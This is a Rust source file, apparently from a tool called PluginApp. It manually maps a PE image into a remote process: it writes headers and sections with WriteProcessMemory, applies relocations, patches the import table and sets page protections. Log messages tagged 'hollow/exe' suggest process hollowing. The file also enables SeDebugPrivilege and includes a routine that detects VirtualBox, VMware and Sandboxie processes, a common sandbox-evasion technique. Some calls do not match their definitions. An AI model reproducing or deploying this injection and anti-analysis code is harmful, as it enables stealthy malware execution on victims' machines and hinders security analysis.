use anyhow::Context;
use windows::Win32::{Foundation::*, Security::{AdjustTokenPrivileges, LookupPrivilegeValueA, SE_PRIVILEGE_ENABLED, TOKEN_ADJUST_PRIVILEGES, TOKEN_PRIVILEGES, TOKEN_QUERY}, System::{Diagnostics::{Debug::*, ToolHelp::*}, LibraryLoader::*, Memory::{VirtualProtectEx, PAGE_EXECUTE_READ, PAGE_EXECUTE_READWRITE, PAGE_PROTECTION_FLAGS, PAGE_READONLY, PAGE_READWRITE}, SystemServices::IMAGE_DOS_HEADER, Threading::*}};
use windows_strings::PCSTR;
use std::ffi::c_void;
use crate::PluginApp;

impl PluginApp {
    pub fn get_dll_main_rva(dll_data: &[u8]) -> anyhow::Result<u32, anyhow::Error> {
        let e_lfanew = u32::from_le_bytes(dll_data[0x3C..0x40].try_into().unwrap()) as usize;
        let optional_header = &dll_data[e_lfanew + 0x18..];
        let entry_rva = u32::from_le_bytes(optional_header[0x10..0x14].try_into().unwrap());
        Ok(entry_rva)
    }

    pub fn parse_pe_headers(dll_data: &[u8]) -> anyhow::Result<(usize, u32, usize), anyhow::Error> {
        if dll_data.len() < 64 || &dll_data[0..2] != b"MZ" {
            return Err(anyhow::anyhow!("Invalid DOS header"));
        }

        let e_lfanew = u32::from_le_bytes(dll_data[0x3C..0x40].try_into().unwrap()) as usize;
        if &dll_data[e_lfanew..e_lfanew + 4] != b"PE\0\0" {
            return Err(anyhow::anyhow!("Invalid NT header"));
        }

        let optional_header = &dll_data[e_lfanew + 0x18..];
        let magic = u16::from_le_bytes(optional_header[0..2].try_into().unwrap());

        let (preferred_base, entry_rva, size_of_image) = if magic == 0x10B {
            // PE32
            let base = u32::from_le_bytes(optional_header[0x1C..0x20].try_into().unwrap()) as usize;
            let entry = u32::from_le_bytes(optional_header[0x10..0x14].try_into().unwrap());
            let size = u32::from_le_bytes(optional_header[0x38..0x3C].try_into().unwrap()) as usize;
            (base, entry, size)
        } else if magic == 0x20B {
            // PE32+
            let base = u64::from_le_bytes(optional_header[0x18..0x20].try_into().unwrap()) as usize;
            let entry = u32::from_le_bytes(optional_header[0x10..0x14].try_into().unwrap());
            let size = u32::from_le_bytes(optional_header[0x38..0x3C].try_into().unwrap()) as usize;
            (base, entry, size)
        } else {
            return Err(anyhow::anyhow!("Unsupported PE format"));
        };

        Ok((preferred_base, entry_rva, size_of_image))
    }

    pub fn map_pe_sections(dll_data: &[u8], process_handle: HANDLE, base_addr: *mut c_void) -> anyhow::Result<(), anyhow::Error> {
        unsafe {
            let e_lfanew = u32::from_le_bytes(dll_data[0x3C..0x40].try_into().unwrap()) as usize;
            let optional_header = &dll_data[e_lfanew + 0x18..];
            let magic = u16::from_le_bytes(optional_header[0..2].try_into().unwrap());
            
            let size_of_headers = if magic == 0x10B {
                u32::from_le_bytes(optional_header[0x3C..0x40].try_into().unwrap()) as usize
            } else {
                u32::from_le_bytes(optional_header[0x3C..0x40].try_into().unwrap()) as usize
            };

            // Write headers
            WriteProcessMemory(
                process_handle,
                base_addr,
                dll_data.as_ptr() as _,
                size_of_headers,
                None,
            ).map_err(|e| anyhow::anyhow!("Failed to write headers: {}", e))?;

            // Map sections
            let number_of_sections = u16::from_le_bytes(dll_data[e_lfanew + 6..e_lfanew + 8].try_into().unwrap()) as usize;
            let section_table = e_lfanew + 24 + if magic == 0x10B { 96 } else { 112 };

            for i in 0..number_of_sections {
                let section_offset = section_table + i * 40;
                let virtual_address = u32::from_le_bytes(dll_data[section_offset + 12..section_offset + 16].try_into().unwrap()) as usize;
                let size_of_raw_data = u32::from_le_bytes(dll_data[section_offset + 16..section_offset + 20].try_into().unwrap()) as usize;
                let pointer_to_raw_data = u32::from_le_bytes(dll_data[section_offset + 20..section_offset + 24].try_into().unwrap()) as usize;

                if size_of_raw_data > 0 && pointer_to_raw_data > 0 {
                    WriteProcessMemory(
                        process_handle,
                        (base_addr as usize + virtual_address) as *mut _,
                        dll_data.as_ptr().add(pointer_to_raw_data) as _,
                        size_of_raw_data,
                        None,
                    ).map_err(|e| anyhow::anyhow!("Failed to write section {}: {}", i, e))?;
                }
            }

            Ok(())
        }
    }

    pub fn apply_relocations(pe_data: &[u8], process_handle: HANDLE, new_base: usize, preferred_base: usize) -> anyhow::Result<()> {
        let delta = new_base.wrapping_sub(preferred_base);
        if delta == 0 { return Ok(()); }

        let dos_header = unsafe { &*(pe_data.as_ptr() as *const IMAGE_DOS_HEADER) };
        let nt_headers_ptr = (pe_data.as_ptr() as usize + dos_header.e_lfanew as usize) as *const IMAGE_NT_HEADERS64;
        let optional_header = unsafe { &(*nt_headers_ptr).OptionalHeader };

        let reloc_dir = optional_header.DataDirectory[5]; // IMAGE_DIRECTORY_ENTRY_BASERELOC
        if reloc_dir.VirtualAddress == 0 || reloc_dir.Size == 0 { return Ok(()); }

        let mut reloc_offset = rva_to_offset(pe_data, reloc_dir.VirtualAddress as usize)?;
        let reloc_end = reloc_offset + reloc_dir.Size as usize;

        while reloc_offset < reloc_end {
            let page_rva = u32::from_le_bytes(pe_data[reloc_offset..reloc_offset + 4].try_into()?);
            let block_size = u32::from_le_bytes(pe_data[reloc_offset + 4..reloc_offset + 8].try_into()?);
            if block_size == 0 { break; }

            let entries_count = (block_size as usize - 8) / 2;
            for i in 0..entries_count {
                let entry_offset = reloc_offset + 8 + i * 2;
                let entry = u16::from_le_bytes(pe_data[entry_offset..entry_offset + 2].try_into()?);
                let reloc_type = entry >> 12;
                let offset_in_page = entry & 0xFFF;
                let reloc_addr = new_base + page_rva as usize + offset_in_page as usize;

                match reloc_type {
                    3 => { // IMAGE_REL_BASED_HIGHLOW (32-bit)
                        let mut original_value = 0u32;
                        unsafe { ReadProcessMemory(process_handle, reloc_addr as *const _, &mut original_value as *mut _ as *mut c_void, 4, None) }?;
                        let new_value = original_value.wrapping_add(delta as u32);
                        unsafe { WriteProcessMemory(process_handle, reloc_addr as *mut _, &new_value as *const _ as *const c_void, 4, None) }?;
                    },
                    10 => { // IMAGE_REL_BASED_DIR64 (64-bit)
                        let mut original_value = 0u64;
                        unsafe { ReadProcessMemory(process_handle, reloc_addr as *const _, &mut original_value as *mut _ as *mut c_void, 8, None) }?;
                        let new_value = original_value.wrapping_add(delta as u64);
                        unsafe { WriteProcessMemory(process_handle, reloc_addr as *mut _, &new_value as *const _ as *const c_void, 8, None) }?;
                    },
                    0 => {}, // IMAGE_REL_BASED_ABSOLUTE (skip)
                    _ => println!("[reloc][warn] Unhandled relocation type: {}", reloc_type),
                }
            }
            reloc_offset += block_size as usize;
        }
        Ok(())
    }

    pub fn resolve_imports(dll_data: &[u8], process_handle: HANDLE, base_addr: *mut c_void) -> anyhow::Result<(), anyhow::Error> {
        unsafe {
            let e_lfanew = u32::from_le_bytes(dll_data[0x3C..0x40].try_into().unwrap()) as usize;
            let optional_header = &dll_data[e_lfanew + 0x18..];
            let magic = u16::from_le_bytes(optional_header[0..2].try_into().unwrap());

            let import_rva = if magic == 0x10B {
                u32::from_le_bytes(optional_header[0x80..0x84].try_into().unwrap()) as usize
            } else {
                u32::from_le_bytes(optional_header[0x90..0x94].try_into().unwrap()) as usize
            };

            if import_rva == 0 {
                return Ok(()); // No imports
            }

            let import_offset = Self::rva_to_offset(dll_data, import_rva)
                .map_err(|e| anyhow::anyhow!("Invalid import table RVA: {}", e))?;

            let mut current_offset = import_offset;
            loop {
                let _original_first_thunk = u32::from_le_bytes(dll_data[current_offset..current_offset + 4].try_into().unwrap()) as usize;
                let name_rva = u32::from_le_bytes(dll_data[current_offset + 12..current_offset + 16].try_into().unwrap()) as usize;
                let first_thunk = u32::from_le_bytes(dll_data[current_offset + 16..current_offset + 20].try_into().unwrap()) as usize;

                if name_rva == 0 {
                    break; // End of import table
                }

                // Get DLL name
                let name_offset = Self::rva_to_offset(dll_data, name_rva)
                    .map_err(|e| anyhow::anyhow!("Invalid DLL name RVA: {}", e))?;
                let dll_name_end = dll_data[name_offset..].iter().position(|&b| b == 0).unwrap_or(0);
                let dll_name = std::str::from_utf8(&dll_data[name_offset..name_offset + dll_name_end])
                    .map_err(|e| anyhow::anyhow!("Invalid DLL name: {}", e))?;

                // Load the DLL in current process to resolve imports
                println!("[hollow/exe] Loading DLL: {}", dll_name);
                let h_module = GetModuleHandleA(PCSTR(format!("{}\0", dll_name).as_ptr()))
                    .or_else(|_| {
                        println!("[hollow/exe] DLL not loaded, attempting to load: {}", dll_name);
                        LoadLibraryA(PCSTR(format!("{}\0", dll_name).as_ptr()))
                    })
                    .map_err(|e| anyhow::anyhow!("Failed to load {}: {}", dll_name, e))?;

                // Resolve function addresses
                let mut thunk_offset = Self::rva_to_offset(dll_data, first_thunk)
                    .map_err(|e| anyhow::anyhow!("Invalid first thunk RVA: {}", e))?;
                let mut iat_addr = (base_addr as usize + first_thunk) as *mut u64;

                loop {
                    let thunk_value = u64::from_le_bytes(dll_data[thunk_offset..thunk_offset + 8].try_into().unwrap());
                    if thunk_value == 0 {
                        break;
                    }

                    let func_addr = if thunk_value & 0x8000000000000000 != 0 {
                        // Import by ordinal
                        let ordinal = thunk_value & 0xFFFF;
                        GetProcAddress(h_module, PCSTR(ordinal as *const u8))
                    } else {
                        // Import by name
                        let name_table_rva = thunk_value as usize;
                        let name_table_offset = Self::rva_to_offset(dll_data, name_table_rva + 2)
                            .map_err(|e| anyhow::anyhow!("Invalid import name RVA: {}", e))?;
                        let func_name_end = dll_data[name_table_offset..].iter().position(|&b| b == 0).unwrap_or(0);
                        let func_name = std::str::from_utf8(&dll_data[name_table_offset..name_table_offset + func_name_end])
                            .map_err(|e| anyhow::anyhow!("Invalid function name: {}", e))?;
                        
                        GetProcAddress(h_module, PCSTR(format!("{}\0", func_name).as_ptr()))
                    };

                    if let Some(addr) = func_addr {
                        println!("[hollow/exe] Resolved function at: 0x{:X}", addr as usize);
                        WriteProcessMemory(
                            process_handle,
                            iat_addr as _,
                            &(addr as u64) as *const _ as _,
                            8,
                            None,
                        ).map_err(|e| anyhow::anyhow!("Failed to write IAT entry: {}", e))?;
                    } else {
                        println!("[hollow/exe] Failed to resolve function, leaving as zero");
                    }

                    thunk_offset += 8;
                    iat_addr = iat_addr.add(1);
                }

                current_offset += 20; // Size of IMAGE_IMPORT_DESCRIPTOR
            }

            Ok(())
        }
    }

    /// Get the base address of a module in a remote process
    pub unsafe fn get_remote_module_base(process_handle: HANDLE, module_name: &str) -> anyhow::Result<usize, anyhow::Error> {
        let snapshot = unsafe { CreateToolhelp32Snapshot(TH32CS_SNAPMODULE | TH32CS_SNAPMODULE32, GetProcessId(process_handle)) }?;
        
        let mut module_entry = MODULEENTRY32W::default();
        module_entry.dwSize = std::mem::size_of::<MODULEENTRY32W>() as u32;
        
        if unsafe { Module32FirstW(snapshot, &mut module_entry).is_ok() } {
            loop {
                let current_name = String::from_utf16_lossy(&module_entry.szModule)
                    .trim_end_matches('\0')
                    .to_lowercase();
                
                if current_name == module_name.to_lowercase() {
                    unsafe { CloseHandle(snapshot).ok() };
                    return Ok(module_entry.modBaseAddr as usize);
                }
                
                if unsafe { Module32NextW(snapshot, &mut module_entry).is_err() } {
                    break;
                }
            }
        }
        
        unsafe { CloseHandle(snapshot).ok() };
        Err(anyhow::anyhow!("Module {} not found in target process", module_name))
    }

    pub fn get_remote_module_base_from_pid(pid: u32, module_name: &str) -> Option<*mut std::ffi::c_void> {
        unsafe {
            let snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPMODULE, pid).ok()?;
            let mut entry = MODULEENTRY32 {
                dwSize: std::mem::size_of::<MODULEENTRY32>() as u32,
                ..Default::default()
            };

            if Module32First(snapshot, &mut entry).is_ok() {
                loop {
                    let name = std::ffi::CStr::from_ptr(entry.szModule.as_ptr())
                        .to_string_lossy()
                        .to_lowercase();
                    if name == module_name.to_lowercase() {
                        return Some(entry.modBaseAddr as _);
                    }
                    if !Module32Next(snapshot, &mut entry).is_ok() {
                        break;
                    }
                }
            }
            None
        }
    }  
}

/// Sets the correct memory protections for each section of the mapped image.
pub fn set_section_protections(dll_data: &[u8], process_handle: HANDLE, base_addr: *mut c_void) -> anyhow::Result<(), anyhow::Error> {
    unsafe {
        let e_lfanew = u32::from_le_bytes(dll_data[0x3C..0x40].try_into().unwrap()) as usize;
        let optional_header = &dll_data[e_lfanew + 0x18..];
        let magic = u16::from_le_bytes(optional_header[0..2].try_into().unwrap());
        
        let number_of_sections = u16::from_le_bytes(dll_data[e_lfanew + 6..e_lfanew + 8].try_into().unwrap()) as usize;
        let section_table = e_lfanew + 24 + if magic == 0x10B { 96 } else { 112 };
        println!("Section table: {section_table}");

        // Get the total image size from the PE header for bounds checking
        let dos_header = &*(dll_data.as_ptr() as *const IMAGE_DOS_HEADER);
        let nt_headers_ptr = (dll_data.as_ptr() as usize + dos_header.e_lfanew as usize) as *const IMAGE_NT_HEADERS64;
        let optional_header = &(*nt_headers_ptr).OptionalHeader;
        let size_of_image = optional_header.SizeOfImage as usize;

        println!("Allocated image range: 0x{:X} - 0x{:X}", base_addr as usize, base_addr as usize + size_of_image);
        for i in 0..number_of_sections {
            let section_offset = section_table + i * 40;
            let name = &dll_data[section_offset..section_offset+8];
            let name_bytes = name.iter().cloned().take_while(|&b| b != 0).collect::<Vec<u8>>();
            let name_str = String::from_utf8_lossy(&name_bytes);
            let misc = u32::from_le_bytes(dll_data[section_offset + 8..section_offset + 12].try_into().unwrap());
            let virtual_size = misc;
            let virtual_address = u32::from_le_bytes(dll_data[section_offset + 12..section_offset + 16].try_into().unwrap()) as usize;
            let raw_size = u32::from_le_bytes(dll_data[section_offset + 16..section_offset + 20].try_into().unwrap()) as usize;
            let raw_ptr = u32::from_le_bytes(dll_data[section_offset + 20..section_offset + 24].try_into().unwrap());
            let relocs_ptr = u32::from_le_bytes(dll_data[section_offset + 24..section_offset + 28].try_into().unwrap());
            let linenums_ptr = u32::from_le_bytes(dll_data[section_offset + 28..section_offset + 32].try_into().unwrap());
            let num_relocs = u16::from_le_bytes(dll_data[section_offset + 32..section_offset + 34].try_into().unwrap());
            let num_linenums = u16::from_le_bytes(dll_data[section_offset + 34..section_offset + 36].try_into().unwrap());
            let characteristics = u32::from_le_bytes(dll_data[section_offset + 36..section_offset + 40].try_into().unwrap());

            println!("Section {}: name='{}' offset=0x{:X}", i, name_str, section_offset);
            println!("  virtual_address=0x{:X}", virtual_address);
            println!("  virtual_size=0x{:X}", virtual_size);
            println!("  raw_size=0x{:X}", raw_size);
            println!("  raw_ptr=0x{:X}", raw_ptr);
            println!("  relocs_ptr=0x{:X}", relocs_ptr);
            println!("  linenums_ptr=0x{:X}", linenums_ptr);
            println!("  num_relocs=0x{:X}", num_relocs);
            println!("  num_linenums=0x{:X}", num_linenums);
            println!("  characteristics=0x{:X}", characteristics);

            // Use the larger of VirtualSize or SizeOfRawData, but never zero
            let size = std::cmp::max(virtual_size as usize, raw_size);

            // Stricter bounds and discardable check
            if size == 0 {
                println!("[protect] Skipping section {}: zero size", i);
                continue;
            }
            if virtual_address == 0 {
                println!("[protect] Skipping section {}: zero virtual address", i);
                continue;
            }
            if virtual_address + size > size_of_image {
                println!("[protect] Skipping section {}: out-of-bounds (addr=0x{:X}, size=0x{:X}, image=0x{:X})", i, virtual_address, size, size_of_image);
                continue;
            }
            if size > 0x1000000 {
                println!("[protect] Skipping section {}: absurd size (0x{:X})", i, size);
                continue;
            }
            if characteristics & 0x02000000 != 0 {
                println!("[protect] Skipping section {}: discardable", i);
                continue;
            }

            let protection = if characteristics & 0x20000000 != 0 { // IMAGE_SCN_MEM_EXECUTE
                if characteristics & 0x80000000 != 0 { // IMAGE_SCN_MEM_WRITE
                    PAGE_EXECUTE_READWRITE
                } else {
                    PAGE_EXECUTE_READ
                }
            } else if characteristics & 0x80000000 != 0 { // IMAGE_SCN_MEM_WRITE
                PAGE_READWRITE
            } else {
                PAGE_READONLY
            };

            println!("protection: {:X}", protection.0);

            let mut old_protect = PAGE_PROTECTION_FLAGS(0);
            let remote_addr = (base_addr as usize + virtual_address) as *mut _;
            println!("Calling VirtualProtectEx: addr=0x{:X}, size=0x{:X}, protection=0x{:X}", remote_addr as usize, size, protection.0);
            VirtualProtectEx(
                process_handle,
                remote_addr,
                size,
                protection,
                &mut old_protect,
            )
            .context("VirtualProtectEx")
            .map_err(|e| anyhow::anyhow!("Error with VirtualProtectEx: {e:?}"))?;
        }

        Ok(())
    }
}

/// Converts a Relative Virtual Address (RVA) to a file offset.
pub fn rva_to_offset(pe_data: &[u8], rva: usize) -> anyhow::Result<usize> {
    let dos_header = unsafe { &*(pe_data.as_ptr() as *const IMAGE_DOS_HEADER) };
    let nt_headers_ptr = (pe_data.as_ptr() as usize + dos_header.e_lfanew as usize) as *const IMAGE_NT_HEADERS64;
    let file_header = unsafe { &(*nt_headers_ptr).FileHeader };
    let optional_header = unsafe { &(*nt_headers_ptr).OptionalHeader };

    let sections_ptr = (nt_headers_ptr as usize + std::mem::size_of::<IMAGE_NT_HEADERS64>()) as *const IMAGE_SECTION_HEADER;
    let sections = unsafe { std::slice::from_raw_parts(sections_ptr, file_header.NumberOfSections as usize) };

    for section in sections {
        if rva >= section.VirtualAddress as usize && rva < (section.VirtualAddress + unsafe { section.Misc.VirtualSize }) as usize {
            return Ok((rva - section.VirtualAddress as usize) + section.PointerToRawData as usize);
        }
    }
    
    if rva < optional_header.SizeOfHeaders as usize {
        return Ok(rva);
    }

    Err(anyhow::anyhow!("RVA 0x{:X} not found in any section or header", rva))
}

// Enable SeDebugPrivilege for the current process
pub fn enable_debug_privilege() -> anyhow::Result<(), anyhow::Error> {
    unsafe {
        let mut h_token: HANDLE = HANDLE(std::ptr::null_mut());

        OpenProcessToken(
            GetCurrentProcess(), 
            TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, 
            &mut h_token
        ).context("OpenProcessToken failed")?;

        let mut luid = LUID::default();

        LookupPrivilegeValueA(
            None, 
            PCSTR(b"SeDebugPrivilege\0".as_ptr()), 
            &mut luid
        ).context("LookupPrivilegeValueA failed")?;

        let tp = TOKEN_PRIVILEGES {
            PrivilegeCount: 1,
            Privileges: [windows::Win32::Security::LUID_AND_ATTRIBUTES {
                Luid: luid,
                Attributes: SE_PRIVILEGE_ENABLED,
            }; 1],
        };
        
        AdjustTokenPrivileges(h_token, false, Some(&tp), 0, None, None).context("AdjustTokenPrivileges failed")?;
    }
    Ok(())
}

// Helper function to detect analysis environments
pub fn detect_analysis_environment() -> bool {
    unsafe {
        // Check for common VM/sandbox indicators
        let indicators = [
            "VBoxService.exe",
            "vmtoolsd.exe", 
            "vmsrvc.exe",
            "vboxservice.exe",
            "sandboxiedcomlaunch.exe",
            "sbiesvc.exe",
        ];

        let snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
        if let Ok(snapshot) = snapshot {
            let mut entry = PROCESSENTRY32 {
                dwSize: std::mem::size_of::<PROCESSENTRY32>() as u32,
                ..Default::default()
            };

            if Process32First(snapshot, &mut entry).is_ok() {
                loop {
                    let name = std::ffi::CStr::from_ptr(entry.szExeFile.as_ptr())
                        .to_string_lossy()
                        .to_lowercase();
                    
                    for indicator in &indicators {
                        if name.contains(&indicator.to_lowercase()) {
                            return true;
                        }
                    }

                    if !Process32Next(snapshot, &mut entry).is_ok() {
                        break;
                    }
                }
            }
        }
    }
    false
}


